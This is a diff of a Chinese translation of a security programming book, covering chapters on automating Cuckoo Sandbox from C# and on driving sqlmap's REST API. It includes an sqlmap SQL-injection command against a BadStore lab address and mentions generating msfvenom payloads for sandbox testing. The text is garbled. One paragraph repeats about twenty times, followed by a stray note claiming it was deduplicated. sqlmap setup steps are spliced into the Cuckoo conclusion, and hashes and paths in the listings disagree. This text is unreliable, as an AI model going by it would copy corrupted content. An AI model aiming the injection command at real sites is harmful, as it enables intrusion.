-第二个 ExecuteCommand 方法接受三个参数：要请求的 URI、HTTP 方法以及一个将发送在 HTTP 多部分请求中的参数字典。多部分请求允许你将更复杂的数据（如带有其他 HTTP 参数的文件）发送到 Web 服务器，这正是我们将使用的方式。在实例化新请求 ② 并设置 HTTP 方法 ③ 后，我们创建一个用于分隔 HTTP 参数的边界（boundary）。一旦创建了边界，调用 GetMultipartData ⑤（稍后将实现）将参数字典转换为多部分表单。
+第二个 `ExecuteCommand` 方法接受三个参数：要请求的 URI、HTTP 方法以及一个将发送在 HTTP 多部分请求中的参数字典。多部分请求允许你将更复杂的数据（如带有其他 HTTP 参数的文件）发送到 Web 服务器，这正是我们将使用的方式。在实例化新请求 ② 并设置 HTTP 方法 ③ 后，我们创建一个用于分隔 HTTP 参数的边界（`boundary`）。一旦创建了边界，调用 `GetMultipartData` ⑤（稍后将实现）将参数字典转换为多部分表单。
 
-在构建多部分数据后，我们需要通过设置 ContentLength 和 ContentType 属性来设置 HTTP 请求。对于 ContentType 属性，我们还会附加用于分隔 HTTP 参数的边界 ⑥。最后，我们将多部分数据写入 ⑦ HTTP 请求并从服务器读取 ➋ 响应。对于服务器最后的响应，将其解析为 JSON 并返回 JSON 对象。
+在构建多部分数据后，我们需要通过设置 `ContentLength` 和 `ContentType` 属性来设置 HTTP 请求。对于 `ContentType` 属性，我们还会附加用于分隔 HTTP 参数的边界 ⑥。最后，我们将多部分数据写入 ⑦ HTTP 请求并从服务器读取 ➋ 响应。对于服务器最后的响应，将其解析为 JSON 并返回 JSON 对象。
 
-这两个 ExecuteCommand() 方法都将用于对 Cuckoo Sandbox 执行 API 调用。但在开始调用 API 之前，我们需要编写代码。
+这两个 `ExecuteCommand()` 方法都将用于对 Cuckoo Sandbox 执行 API 调用。但在开始调用 API 之前，我们需要编写代码。
 
-## 使用 GetMultipartData() 方法创建多部分 HTTP 数据
+## 使用 `GetMultipartData()` 方法创建多部分 HTTP 数据
 
-尽管 GetMultipartData() 方法是 Cuckoo Sandbox 通信的核心，但我并不会逐行讲解。该方法实际上是 C# 核心库的一个小弱点的示例，因为创建多部分 HTTP 请求不应该如此复杂。不幸的是，没有易用的类可以实现这一点，因此我们需要创建此方法从头构建多部分请求。构建多部分请求的原始技术细节超出了我们关注的通用流程范围。完整的方法（见列表 8-8，去除了行内注释）由 Brian Greensstein 编写，其工作随后被纳入 RestSharp 客户端（http://restsharp.org/）。
+尽管 `GetMultipartData()` 方法是 Cuckoo Sandbox 通信的核心，但我并不会逐行讲解。该方法实际上是 C# 核心库的一个小弱点的示例，因为创建多部分 HTTP 请求不应该如此复杂。不幸的是，没有易用的类可以实现这一点，因此我们需要创建此方法从头构建多部分请求。构建多部分请求的原始技术细节超出了我们关注的通用流程范围。完整的方法（见列表 8-8，去除了行内注释）由 Brian Greensstein 编写，其工作随后被纳入 RestSharp 客户端（`http://restsharp.org/`）。
 
 ```csharp
 private byte[] GetMultipartData(IDictionary<string, object> parms, string boundary)
@@ -4977,34 +5031,38 @@ private byte[] GetMultipartData(IDictionary<string, object> parms, string bounda
     needsCLRF = true;
 ```
 
-在 GetMultipartFormData() 方法 I 中，我们开始接受两个参数：第一个是我们要转换为多部分表单的参数字典及其对应的值，第二个是我们用于分隔请求中参数的字符串，以便它们被解析。第二个参数被称为 boundary，使用它来告诉 API 使用此边界解析 HTTP 请求体，然后将每个部分视为独立的参数和值。这可能很难可视化，列表 8-9 详细了一个示例 HTTP 多部分请求。
+在 `GetMultipartFormData()` 方法 I 中，我们开始接受两个参数：第一个是我们要转换为多部分表单的参数字典及其对应的值，第二个是我们用于分隔请求中参数的字符串，以便它们被解析。第二个参数被称为 `boundary`，使用它来告诉 API 使用此边界解析 HTTP 请求体，然后将每个部分视为独立的参数和值。这可能很难可视化，列表 8-9 详细了一个示例 HTTP 多部分请求。
 
 ```
 /POST HTTP/1.1
 Host: localhost:8080
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:29.0) Gecko/20100101 Firefox/29.0
-Accept: text/html,application+xml,application/xml;q=0.9,*/*q=0.8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Connection: keep-alive
 ```
 
-
-
-
 Content-Type: multipart/form-data;
+
 boundary=------9059140415448443365972542666
+
 Content-Length: 554
 
 ------9059140415448443365972542666
+
 Content-Disposition: form-data;name="text"
 
 text default=------9059140415448443365972542666
+
 Content-Disposition: form-data;name="file1";nContent-Type: text/plain
+
 Content of a.txt.
 
 ------9059140415448443365972542666
+
 Content-Disposition: form-data;name="file2";filename="a.html"
+
 Content-Type: text/html
 
 ```
@@ -5015,7 +5073,7 @@ A sample multipart form request
 
 **列表 8-9** 这个 HTTP 请求看起来就像我们正尝试构建的，因此让我们指出 `GetMultipartFormData()` 中提到的重要部分。首先，Content-Type 请求头为 `multipart/form-data` 并带有一个边界 ②，就像我们在**列表 8-7** 中设置的一样。该边界贯穿整个 HTTP 请求。每个参数都包含一个参数名称和值。`GetMultipartFormData()` 方法接收我们通过 `Dictionary` 参数传递的参数名称、值以及边界，并使用给定的边界分隔每个参数，将它们转换为类似的 HTTP 请求。
 
-## 使用 FileParameter 类处理文件数据
+## 使用 `FileParameter` 类处理文件数据
 
 为了发送我们想要分析的 Cuckoo 文件或恶意软件，我们需要创建一个类，用来存储文件数据，例如文件类型、文件名和文件的实际内容。简单的 `FileParameter` 类封装了 `GetMultipartFormData()` 方法需要的一些信息。它在**列表 8-10** 中所示。
 
@@ -5035,11 +5093,11 @@ public class FileParameter
 }
 ```
 
-# 列表 8-10: FileParameter 类
+# 列表 8-10：`FileParameter` 类
 
 `FileParameter` 类代表了构建 HTTP 参数所需的数据，该参数将包含待分析的文件。该类的构造函数接受三个参数：包含文件内容的字节数组、文件名和内容类型。每个参数随后被赋值给相应的类属性。
 
-## 测试 CuckooSession 及辅助类
+## 测试 `CuckooSession` 及辅助类
 
 我们可以通过一个短而简单的 `Main()` 方法来测试目前编写的内容，该方法通过 API 请求 Cuckoo Sandbox 的状态。我们在第 149 页的“检查 Cuckoo 状态”中已经手动执行过这一操作。列表 8-11 显示了我们如何使用新的 `CuckooSession` 类来实现这一点。
 
@@ -5052,7 +5110,7 @@ public static void main(String[] args)
 }
 ```
 
-# 列表 8-11: 获取 Cuckoo Sandbox 状态的 Main() 方法
+# 列表 8-11：获取 Cuckoo Sandbox 状态的 `Main()` 方法
 
 通过新的 `Main()`，我们通过传递 Cuckoo Sandbox 运行 IP 地址和端口创建一个 `CuckooSession` 对象。如果 API 运行在本地机器上，IP 使用 `127.0.0.1` 应该是可以。IP 和端口（默认为 8090）在我们在列表 8-3 中启动 API 时已经设置。使用新会话，我们调用 `ExecuteCommand()` 方法，将 URI `/cuckoo/status` 作为第一个参数，将 HTTP 方法 `GET` 作为第二个参数。使用 `WriteLine(response)` 将响应打印到屏幕上。
 
@@ -5091,11 +5149,11 @@ $ .ch8_automating_cuckoo.exe
 }
 ```
 
-列表 8-12: 用于打印 Cuckoo 状态信息的 JSON 字典
+列表 8-12：用于打印 Cuckoo 状态信息的 JSON 字典。
 
-## 实现 CuckooManager 类
+## 实现 `CuckooManager` 类
 
-有了 CuckooSession 类和辅助类后，我们可以转向 `CuckooManager` 类，它封装了几个 API 调用。为了启动 `CuckooManager` 类，我们需要列表 8-13 中的：
+有了 `CuckooSession` 类和辅助类后，我们可以转向 `CuckooManager` 类，它封装了几个 API 调用。为了启动 `CuckooManager` 类，我们需要列表 8-13 中的：
 
 ```csharp
 public class CuckooManager : Disposable
@@ -5108,13 +5166,15 @@ public class CuckooManager : Disposable
 }
 ```
 
-# 列表 8-13: 初始化 CuckooManager 类
+# 列表 8-13：初始化 `CuckooManager` 类
 
 `CuckooManager` 类通过实现 `IDisposable` 接口，在我们完成工作后释放 `_session` 变量。该类的构造函数只接受一个参数：用于与 Cuckoo Sandbox 通信的 session。
 
-## 编写 CreateTask 方法
+## 编写 `CreateTask` 方法
 
 `CuckooManager` 类中的 `CreateTask()` 方法如列表 8-14 所示。
+
+
 
 ```csharp
 public int CreateTask(Task task)
@@ -5146,7 +5206,7 @@ public int CreateTask(Task task)
 
 # 列表 8-14: CreateTask 方法
 
-`CreateTask()` 方法首先检查传入的任务是否为文件 ② 由于 Cuckoo Sandbox 支持非文件（如 URL），`CreateTask()` 方法可以扩展以创建不同类型的任务。如果任务是 `FileTask`，我们使用 StreamReader ③ 打开文件并发送到 Cuckoo Sandbox。一旦文件被读取 ④，我们使用文件名、文件字节和类型创建一个 `FileParameter` 类 ③。
+`CreateTask()` 方法首先检查传入的任务是否为文件 ② 由于 Cuckoo Sandbox 支持非文件（如 URL），`CreateTask()` 方法可以扩展以创建不同类型的任务。如果任务是 `FileTask`，我们使用 `StreamReader` ③ 打开文件并发送到 Cuckoo Sandbox。一旦文件被读取 ④，我们使用文件名、文件字节和类型创建一个 `FileParameter` 类 ③。
 
 然后我们使用新的 `Dictionary` ⑤ 构建发送给 Cuckoo Sandbox 的 HTTP 参数。这些 HTTP 参数在 Cuckoo Sandbox 文档中有说明，包含了创建任务所需的信息。这些参数允许我们更改默认配置，例如使用哪个虚拟机 ➆。最后，通过传递字典调用 `ExecuteCommand()` ⑦ 创建新任务并返回 ⑧ 任务 ID
 
@@ -5156,12 +5216,9 @@ public int CreateTask(Task task)
 
 列表 8-15: 获取任务信息和报告的辅助方法
 
-
-
-
 我们实现的第一个方法是 `GetTaskDetails()` 方法 ❶，它接受一个任务 ID 作为变量 `id` 的唯一参数。我们首先通过将 ID 参数附加到 `/tasks/view` ➁ 创建我们要构建的 URI，然后使用该新 URI 调用 `ExecuteCommand()` ③。此端点返回有关任务的信息，例如运行该任务的 VM 名称以及任务的当前状态，我们可以利用它来等待任务直到其完成。最后，我们使用 `TaskFactory.CreateTask()` 方法 ④ 将 API 返回的 JSON 任务转换为 C# `Task` 类（我们将在下一节中创建该类）。
 
-第二个第二个方法是一个简单的易便方法（convenience method），因为 Cuckoo Sandbox 支持多种类型的报告（JSON、XML 等），并且有两个 `GetTaskReport()` 方法，其中第一个仅用于 JSON 报告。它接受你想要获取报告的 ID 作为参数，并调用其重载方法，使用与传入 ID 相同的方法名，但第二个参数指定应返回 JSON ⑤ 报告。第二个 `GetTaskReport()` 方法 ⑥ 将任务 ID 和报告类型作为参数传递，然后用于构建在 API 调用中请求的 URI ⑦。新 URI 被传递给 `ExecuteCommand()` 方法 ⑧，并返回来自 Cuckoo Sandbox 的报告。
+第二个方法是一个简单的便捷方法（convenience method），因为 Cuckoo Sandbox 支持多种类型的报告（JSON、XML 等），并且有两个 `GetTaskReport()` 方法，其中第一个仅用于 JSON 报告。它接受你想要获取报告的 ID 作为参数，并调用其重载方法，使用与传入 ID 相同的方法名，但第二个参数指定应返回 JSON ⑤ 报告。第二个 `GetTaskReport()` 方法 ⑥ 将任务 ID 和报告类型作为参数传递，然后用于构建在 API 调用中请求的 URI ⑦。新 URI 被传递给 `ExecuteCommand()` 方法 ⑧，并返回来自 Cuckoo Sandbox 的报告。
 
 最后，`Dispose()` 方法 ⑨ 完成并实现了 `IDisposable` 接口。此方法清理我们用于与 API 通信的会话，将私有变量 `_session` 为 null。
 
@@ -5223,7 +5280,7 @@ public DateTime CompletedOn { get; set; }
 
 列表 8-16: 抽象 Task 类
 
-尽管抽象 `Task` 类 ① 看起来很复杂，但该类只有一个一个构造函数和十几个属性。构造函数 ② 接受一个 `JToken` 作为参数，这是一种类似于 `JSONObject` 的特殊 JSON 类。`JToken` 用于将 JSON 中的所有任务细节赋值给类中的属性。我们在构造函数中第一个赋值数值的属性是 `AddedOn` 属性。使用 `DateTime.Parse()` ③ 将任务创建的时间戳从字符串转换为 `DateTime` 类，这与 `CompletedOn` 属性相同，同样使用了 `DateTime.Parse()` ④（前提是任务已完成）。其余属性直接使用传递给构造函数参数的 JSON 中的值进行赋值。
+尽管抽象 `Task` 类 ① 看起来很复杂，但该类只有一个构造函数和十几个属性。构造函数 ② 接受一个 `JToken` 作为参数，这是一种类似于 `JSONObject` 的特殊 JSON 类。`JToken` 用于将 JSON 中的所有任务细节赋值给类中的属性。我们在构造函数中第一个赋值数值的属性是 `AddedOn` 属性。使用 `DateTime.Parse()` ③ 将任务创建的时间戳从字符串转换为 `DateTime` 类，这与 `CompletedOn` 属性相同，同样使用了 `DateTime.Parse()` ④（前提是任务已完成）。其余属性直接使用传递给构造函数参数的 JSON 中的值进行赋值。
 
 ## 排序和创建不同的类类型
 
@@ -5282,10 +5339,7 @@ public static void Main(string[] args)
 }
 ```
 
-
-
-
-```c
+```csharp
 using (CuckooManager manager = new CuckooManager(session))
 {
     FileTask task = new FileTask();
@@ -5304,7 +5358,7 @@ using (CuckooManager manager = new CuckooManager(session))
 }
 ```
 
-```c
+```csharp
 if (task.Status == "failure")
 {
     Console.Error.WriteLine("There was an error:");
@@ -5313,23 +5367,25 @@ if (task.Status == "failure")
 }
 ```
 
-```c
+```csharp
 return;
 string report = manager.GetTaskReport(taskID).ToString();
 Console.WriteLine(report);
 ```
 
-Listing 8-19：将 CuckooSession 和 CuckooManager 类结合在一起的 Main() 方法
+列表 8-19：将 CuckooSession 和 CuckooManager 类结合在一起的 Main() 方法
 
-在 Main() 方法 ① 中，我们创建一个新的 CuckooSession 实例 ②，在进行 API 请求时传递 IP 地址和连接端口。创建新会话，在 `using` 语句的上下文中，我们创建了一个新的 `CuckooManager` 对象 ③ 和一个新的 `FileTask` 对象 ④。我们还设置了 `Filepath` 属性 ⑤，指向一个包含我们要分析的可执行文件的文件系统路径。为了测试，我们可以使用 Metasploit 的 msfvenom 生成负载（正如我们在第 4 章中所做的），或者使用我们在第 4 章中编写的一些负载。设置好要扫描文件的 `FileTask` 后，我们将任务传递给管理器的 `CreateTask()` 方法，并存储返回的 ID 以备后用。
+在 `Main()` 方法 ① 中，我们创建一个新的 `CuckooSession` 实例 ②，在进行 API 请求时传递 IP 地址和连接端口。创建新会话，在 `using` 语句的上下文中，我们创建了一个新的 `CuckooManager` 对象 ③ 和一个新的 `FileTask` 对象 ④。我们还设置了 `Filepath` 属性 ⑤，指向一个包含我们要分析的可执行文件的文件系统路径。为了测试，我们可以使用 Metasploit 的 `msfvenom` 生成负载（正如我们在第 4 章中所做的），或者使用我们在第 4 章中编写的一些负载。设置好要扫描文件的 `FileTask` 后，我们将任务传递给管理器的 `CreateTask()` 方法，并存储返回的 ID 以备后用。
 
-任务创建后，我们就调用 `GetTaskDetails()` ⑥ 并传递 `CreateTask()` 返回的任务任务 ID。当我们调用 `GetTaskDetails()` 时，该方法会返回一个状态。在这种情况下，我们只对两种状态感兴趣：pending（等待中）和 failure（失败）。只要 `GetTaskDetails()` 返回 pending 状态，我们就会向用户打印一条友好消息，说明任务尚未完成，并让应用程序在下次调用 `GetTaskDetails()` 获取任务状态之前睡眠 30 秒。一旦状态不再是 pending，我们就会检查状态 ⑦，以防分析过程中出现任何错误。如果任务状态为 failure，我们就会打印 Cuckoo Sandbox 返回的错误信息。
+任务创建后，我们就调用 `GetTaskDetails()` ⑥ 并传递 `CreateTask()` 返回的任务 ID。当我们调用 `GetTaskDetails()` 时，该方法会返回一个状态。在这种情况下，我们只对两种状态感兴趣：pending（等待中）和 failure（失败）。只要 `GetTaskDetails()` 返回 pending 状态，我们就会向用户打印一条友好消息，说明任务尚未完成，并让应用程序在下次调用 `GetTaskDetails()` 获取任务状态之前睡眠 30 秒。一旦状态不再是 pending，我们就会检查状态 ⑦，以防分析过程中出现任何错误。如果任务状态为 failure，我们就会打印 Cuckoo Sandbox 返回的错误信息。
 
 然而，如果状态不是 failure，我们可以假设任务已成功完成分析，并且可以从 Cuckoo Sandbox 创建一个包含发现结果的新报告。我们调用 `GetTaskReport()` 方法 ⑮，将任务 ID 作为唯一参数传递，然后使用 `WriteLine()` ⑮ 将报告打印到控制台屏幕。
 
 # 测试应用程序
 
 在完成自动化工作后，我们终于可以驱动 Cuckoo Sandbox 实例来运行并分析一个潜在恶意的 Windows 可执行文件，并获取所运行任务的报告，如列表 8-20 所示。记住以管理员身份运行该实例。
+
+
 
 ```bash
 $ ./child_automating_cuckoo.exe
@@ -5372,7 +5428,7 @@ Waiting 30 seconds...pending
   },
   "urls": [],
   "crc32": "26FB5E54",
-  "path": "/home/berry/tuckoo/binaries/2a694038d2cb0c95baeff2ba11cd6e60a73d1",
+  "path": "/home/berry/tuckoo/binaries/2a694038d6cb0c95baeff2ba11cd6e60a73d1",
   "ssdeep": null,
   "size": 5024,
 }
@@ -5382,78 +5438,90 @@ Waiting 30 seconds...pending
 
 | 字段 | 值 |
 | :--- | :--- |
-| category | file |
-| score | 0.0 |
-| package | |
-| started | 2016-05-19 15:56:44 |
-| route | none |
-| custom | |
-| machine | {"status": "stopped", "name": "Cuckoo01", "label": "cuckoo01", "manager": "VirtualBox", "started_on": "2016-05-19 15:56:44", "shutdown_on": "2016-05-19 15:57:09"} |
-| ended | 2016-05-19 15:57:09 |
-| version | 2.0-rc2 |
-| platform | |
-| owner | |
-| options | |
-| id | 13 |
-| duration | 25 |
+| `category` | `file` |
+| `score` | `0.0` |
+| `package` | |
+| `started` | `2016-05-19 15:56:44` |
+| `route` | `none` |
+| `custom` | |
+| `machine` | `{"status": "stopped", "name": "Cuckoo01", "label": "cuckoo01", "manager": "VirtualBox", "started_on": "2016-05-19 15:56:44", "shutdown_on": "2016-05-19 15:57:09"}` |
+| `ended` | `2016-05-19 15:57:09` |
+| `version` | `2.0-rc2` |
+| `platform` | |
+| `owner` | |
+| `options` | |
+| `id` | `13` |
+| `duration` | `25` |
 
 | 字段 | 值 |
 | :--- | :--- |
-| category | file |
-| yara sha1 | f14518e095285feeb6897c9abd2e5f6855f294 |
-| yara name | bypassuas-x64.exe |
-| type | PE32 executable (console) x86_64, for MS Windows |
-| sha256 | 2a694038d6bc49cfbd8dcaf653b6fb29d2cb02c95baeffb2f4a11cd6e60a73d1 |
+| `category` | `file` |
+| `yara sha1` | `f14518e095285feeb6897c9abd2e5f6855f294` |
+| `yara name` | `bypassuas-x64.exe` |
+| `type` | `PE32 executable (console) x86_64, for MS Windows` |
+| `sha256` | `2a694038d6bc49cfbd8dcaf653b6fb29d2cb02c95baeffb2f4a11cd6e60a73d1` |
 
 | 字段 | 值 |
 | :--- | :--- |
-| crc32 | 26FB5E54 |
-| path | /home/berry/tuckoo/binaries/2a694038d2cb0c95baeff2ba11cd6e60a73d1 |
-| ssdeep | null |
-| size | 5024 |
+| `crc32` | `26FB5E54` |
+| `path` | `/home/berry/tuckoo/binaries/2a694038d2cb0c95baeff2ba11cd6e60a73d1` |
+| `ssdeep` | `null` |
+| `size` | `5024` |
 
 ## 结论
 
 Cuckoo Sandbox 是一个强大的恶意软件分析框架，通过 API，它可以轻松地集成到响应剧本书中。然而，我们构建的类旨在具有可扩展性，以便添加新类型的任务，例如提交 URL 待打开的任务。
 
+如果你更喜欢 `wget`，可以下载最新 master 分支 ZIP 压缩包，所示：
 
+```bash
+$ wget https://github.com/sqlmapproject/sqlmap/archive/master.zip
+$ unzip master.zip
+```
 
-
-
-如果你更喜欢 wget，可以下载最新 master 分支 ZIP 压缩包，所示：$ wget https://github.com/sqlmapproject/sqlmap/archive/master.zip
-$ unzip master.zip 为了遵循本章的示例，你还应该安装一个 JSON 序列化框架，如开源选项 Json.Net。你可以从 https://github.com/JamesNK/Newtonsoft.Json 下载它，或者使用大多数 C# IDE 中都提供的 NuGet 包管理器。我们在第 2 章和第 5 章中使用过这个库。
+为了遵循本章的示例，你还应该安装一个 JSON 序列化框架，如开源选项 Json.Net。你可以从 `https://github.com/JamesNK/Newtonsoft.Json` 下载它，或者使用大多数 C# IDE 中都提供的 NuGet 包管理器。我们在第 2 章和第 5 章中使用过这个库。
 
 # 运行 sqlmap
 
-大多数安全工程师和渗透测试人员使用 Python 脚本 `sqlmap.py`（位于 sqlmap 项目的根目录或全局安装在系统中）来从命令行驱动 sqlmap。在介绍 API 之前，我们将简要介绍 sqlmap 命令行工具是如何工作的。Kali 预装了 sqlmap，因此命令行工具具有与 API 相同的整体功能，但它无法在不调用 shell 的情况下方便地集成到其他程序中。在与其他代码集成时，程序化调用 API应该比仅仅使用命令行工具更安全、更灵活。
+大多数安全工程师和渗透测试人员使用 Python 脚本 `sqlmap.py`（位于 sqlmap 项目的根目录或全局安装在系统中）来从命令行驱动 sqlmap。在介绍 API 之前，我们将简要介绍 sqlmap 命令行工具是如何工作的。Kali 预装了 sqlmap，因此命令行工具具有与 API 相同的整体功能，但它无法在不调用 shell 的情况下方便地集成到其他程序中。在与其他代码集成时，程序化调用 API 应该比仅仅使用命令行工具更安全、更灵活。
 
-> 注意
-> 如果你没有运行 Kali，你可能下载了 sqlmap 但没有安装在系统中。你可以通过切换到 sqlmap 所在的目录并使用以下代码通过 Python 调用 sqlmap.py 脚本来全局使用 sqlmap：
+> **注意**
+>
+> 如果你没有运行 Kali，你可能下载了 sqlmap 但没有安装在系统中。你可以通过切换到 sqlmap 所在的目录并使用以下代码通过 Python 调用 `sqlmap.py` 脚本来全局使用 sqlmap：
+>
+> ```bash
 > $ python sqlmap.py [-- args --]
+> ```
+>
 > 一个典型的 sqlmap 命令可能如列表 9-1 所示。
+>
+> ```bash
 > $ sqlmap --method=GET --level=3 --technique=B --dbms=mysql -u "http://10.37.129.1/cgi-badstore?search=fdsa&action=search"
+> ```
+>
 > 列表 9-1：针对 BadStore 运行的示例 sqlmap 命令
 
-我们不会涵盖命令的输出，但会涵盖命令的注意事项。在此列表中，我们传递给 sqlmap 的参数告诉它我们想要测试某个 URL（希望是一个熟悉的 URL，比如我们在第 2 章中用 BadStore 测试的那个）。我们告诉 sqlmap 使用 GET 作为 HTTP 方法 ①（此处原文可能有误，应为使用 GET 作为 HTTP 方法 ①）并使用 MySQL  payloads（而不是包含 PostgreSQL 或 Microsoft SQL Server 的 payloads），随后是跟我们想要测试的 URL ②。你可以配合 sqlmap 脚本使用的参数只有一小部分。如果你想手动尝试其他命令，可以在 https://github.com/sqlmapproject/sqlmap/wiki/Usage/ 找到更详细的信息。我们可以使用 sqlmap REST API 来驱动与列表 9-1 中 sqlmap 命令相同的功能。
+我们不会涵盖命令的输出，但会涵盖命令的注意事项。在此列表中，我们传递给 sqlmap 的参数告诉它我们想要测试某个 URL（希望是一个熟悉的 URL，比如我们在第 2 章中用 BadStore 测试的那个）。我们告诉 sqlmap 使用 GET 作为 HTTP 方法 ①（此处原文可能有误，应为使用 GET 作为 HTTP 方法 ①）并使用 MySQL payloads（而不是包含 PostgreSQL 或 Microsoft SQL Server 的 payloads），随后是跟我们想要测试的 URL ②。你可以配合 sqlmap 脚本使用的参数只有一小部分。如果你想手动尝试其他命令，可以在 `https://github.com/sqlmapproject/sqlmap/wiki/Usage/` 找到更详细的信息。我们可以使用 sqlmap REST API 来驱动与列表 9-1 中 sqlmap 命令相同的功能。
 
-在运行 `sqlmapi.py` API 示例时，你可能需要以与 sqlmap 工具不同的方式运行 API，它可能不像 `sqlmap.py` 脚本那样（在 Kali 上可以从系统 shell 调用）。如果你需要下载 sqlmap 来使用 sqlmap API，可以在 GitHub (https://github.com/sqlmapproject/sqlmap/) 上找到它。
+在运行 `sqlmapi.py` API 示例时，你可能需要以与 sqlmap 工具不同的方式运行 API，它可能不像 `sqlmap.py` 脚本那样（在 Kali 上可以从系统 shell 调用）。如果你需要下载 sqlmap 来使用 sqlmap API，可以在 GitHub（`https://github.com/sqlmapproject/sqlmap/`）上找到它。
 
 # sqlmap REST API
 
-关于 sqlmap REST API 的官方文档有点过于简，，但书中包含了你为了高效、有效地使用它所需的所有知识。运行 `sqlmapi.py --server`（位于你下载的 sqlmap 项目目录的根目录下）来启动监听在 127.0.0.1 上的 sqlmap API 服务器（默认端口为 8775），如列表 9-2 所示。
+关于 sqlmap REST API 的官方文档有点过于简略，但书中包含了你为了高效、有效地使用它所需的所有知识。运行 `sqlmapi.py --server`（位于你下载的 sqlmap 项目目录的根目录下）来启动监听在 `127.0.0.1` 上的 sqlmap API 服务器（默认端口为 `8775`），如列表 9-2 所示。
 
-```
+```bash
 $ sqlmapi.py --server
 [22:56:24] [INFO] Received JSON-API request at '127.0.0.1:8775'.
 [22:56:24] [INFO] Admin ID: 75d9bf5817a94f0a745c034f
 [22:56:24] [DEBUG] IPC database: /tmp/sqlmap
 [22:56:24] [DEBUG] JSON-API server connected to database
 ```
+
 列表 9-2：启动 sqlmap 服务器
 
 sqlmap 有几个我们需要创建的 REST API 端点。为了使用 sqlmap，我们需要创建任务，然后使用 API 请求来订购这些任务。大多数可用端点都是 GET 请求，用于检索数据。要查看可用哪些 API 端点，从 sqlmap 目录根目录下运行 `grep "@get"`，如列表 9-3 所示。该命令列出了许多可用端点，这些是 API 中用于某些操作的特殊 URL。
 
-```
+```bash
 $ grep "@get"
 lib/utils/api.py:@get(/task/new)
 lib/utils/api.py:@get(/task/delete)
@@ -5462,24 +5530,24 @@ lib/utils/api.py:@get(/admin/tid/flush)
 lib/utils/api.py:@get(/option/tid/list)
 lib/utils/api.py:@get(/scan/tid/stop)
 ```
+
 列表 9-3：可用的 sqlmap GET 请求
 
 很快我们将介绍如何使用 API 端点来创建 ①、② 和删除 ③ 任务。你可以将此命令中的 `get` 替换为 `post`，发现只有 API 调用需要 HTTP POST 请求，如列表 9-4 所示。
 
-```
+```bash
 $ grep "@post"
 lib/utils/api.py:@post(/option/tid/set)
 lib/utils/api.py:@post(/scan/tid/start)
 ```
-使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。（注：原文此处存在大量重复，已根据指令“不要重复输出原文”进行去重处理，保留翻译逻辑）。
 
